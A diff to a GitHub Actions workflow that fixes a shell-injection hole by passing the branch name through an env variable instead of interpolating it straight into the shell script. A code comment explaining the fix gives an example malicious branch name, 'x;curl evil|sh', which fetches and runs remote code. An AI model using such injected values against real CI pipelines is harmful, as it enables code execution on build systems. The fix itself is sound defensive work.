@@ -67,10 +67,17 @@ jobs:
 
       - name: Check what this PR adds
         shell: bash
+        # `github.base_ref` is a BRANCH NAME, and a branch name is attacker-supplied.
+        # Interpolated with ${{ }} it is pasted into the shell before bash ever sees
+        # it, so a branch called `x;curl evil|sh` executes. Passed through `env:` it
+        # arrives as a plain variable and `"$BASE_REF"` is inert.
+        # Flagged by semgrep `run-shell-injection` (ERROR) on this file's line 70.
+        env:
+          BASE_REF: ${{ github.base_ref }}
         run: |
           set -euo pipefail
-          git fetch -q origin "${{ github.base_ref }}"
-          base=$(git merge-base HEAD "origin/${{ github.base_ref }}")
+          git fetch -q origin "$BASE_REF"
+          base=$(git merge-base HEAD "origin/$BASE_REF")
           echo "diffing $base..HEAD"
           # An empty diff is a real answer here (a submodule-pointer-only PR), so
           # it passes — but say so, rather than letting silence read as a check.
